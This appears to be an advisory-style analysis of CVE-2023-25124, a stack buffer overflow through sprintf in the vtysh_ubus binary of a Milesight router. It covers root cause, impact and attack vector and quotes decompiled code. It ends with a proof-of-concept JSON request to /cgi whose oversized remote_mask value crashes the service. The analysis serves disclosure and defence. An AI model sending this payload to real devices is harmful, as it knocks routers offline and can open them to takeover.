Based on the provided content, here's an analysis of CVE-2023-25124:

**Root Cause of Vulnerability:**
- The vulnerability stems from the use of `sprintf` with user-controlled data within the `set_openvpn_client` function of the `vtysh_ubus` binary. Specifically, the `remote_subnet` and `remote_mask` parameters received via a JSON payload are incorporated into a command string without proper bounds checking.

**Weaknesses/Vulnerabilities Present:**
- **Stack-based Buffer Overflow (CWE-121):** The `sprintf` function writes data into a fixed-size buffer (`vtysh_command_buffer`) on the stack. When the length of the input strings (`remote_subnet`, `remote_mask`) exceeds the buffer's capacity, it leads to a buffer overflow.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By overflowing the stack buffer, an attacker can overwrite return addresses and potentially inject and execute arbitrary code on the device.
- **Denial of Service:** A buffer overflow can lead to the crash of the `vtysh_ubus` process.

**Attack Vectors:**
- **HTTP Requests:** The vulnerability is triggered by sending a specially crafted HTTP POST request to the `/cgi` endpoint of the Milesight router.
- **JSON Payload:** The malicious data is embedded within a JSON payload sent in the POST request.

**Required Attacker Capabilities/Position:**
- **High Privileges:** The attacker needs to be a high-privileged user to send the necessary HTTP requests.
- **Network Access:** The attacker must be able to send HTTP requests to the Milesight router.

**Technical Details:**

- **Vulnerable Function:** `set_openvpn_client` within the `vtysh_ubus` binary.
- **Vulnerable Code Snippet:**

```c
is_equal = strcmp(table_key,"action");
if (is_equal == 0) {
  action = blobmsg_get_u32(table_value);
}
else {
  is_equal = strcmp(table_key,"remote_subnet");
  if (is_equal == 0) {
    remote_subnet = blobmsg_get_string(table_value);
  }
  else {
    is_equal = strcmp(table_key,"remote_mask");
    if (is_equal == 0) {
      remote_mask = blobmsg_get_string(table_value);
    }
    [...]
  }

```

```c
if (remote_mask != 0 && (action != -1 && remote_subnet != 0)) {
    if (action == 2) {
      [...]
    }
    else {
      if (action == 3) {
        command_format_string = "no remote subnet %s mask %s";
      }
      else {
        if (action == 1){
        	command_format_string = "remote subnet %s mask %s";
		}
		else{
			[...]
		}
      }
      sprintf(vtysh_command_buff,command_format_string,remote_subnet,remote_mask);
    }
	[...]
  }
```
- The `remote_subnet` and `remote_mask` values are obtained from the JSON payload, and passed as arguments to `sprintf`.
- The `action` parameter dictates the command string that will be used in the `sprintf` call.
- The `vtysh_command_buff` is a stack-based buffer.

- **Exploit Proof of Concept:**
```json
{
    "id": 9,
    "execute": 1,
    "core": "yruo_vpn_openvpn_client",
    "function": "set",
    "values": [
        {
            "base": "yruo_vpn_openvpn_client",
            "index": 1,
            "value": {
                "remote_subnet":[{
                    "remote_mask":"A"*0x600,
                    "remote_subnet":"",
                    "action":3,
                }]
            }
        }
    ]
}
```
This JSON data will cause the `vtysh_ubus` binary to crash.
